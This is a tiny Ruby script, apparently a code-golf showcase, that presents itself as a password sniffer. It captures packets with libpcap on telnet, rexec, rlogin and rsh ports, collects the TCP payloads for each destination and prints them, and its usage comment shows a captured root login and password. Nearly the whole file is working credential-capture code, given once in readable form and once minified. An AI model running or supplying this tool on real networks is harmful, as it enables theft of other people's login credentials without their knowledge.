#
# Password sniffer in < 140 characters by andrewinfosec@gmail.com
#
# (install libpcap and rubypcap)
# $ sudo ruby ./sniff.rb -i en1 -s 2000 dst port telnet or exec or login or shell
# "foo.example.com:23"
# "root\r\nbirthday\r\n..."
#
# --
#
# require 'pcaplet'
#
# h = {}
# d = Pcaplet.new
# d.each {|p|
#   s = "#{p.dst}:#{p.dport}"
#   (h[s] ||= []) << p.tcp_data
#   t = h[s].to_s
#   t.size > 99 && (p s,t; h.delete(s))
# }
#
require'pcaplet';h={};d=Pcaplet.new;d.each{|p|s="#{p.dst}:#{p.dport}";(h[s]||=[])<<p.tcp_data;t=h[s].to_s;t.size>99&&(p s,t;h.delete(s))}
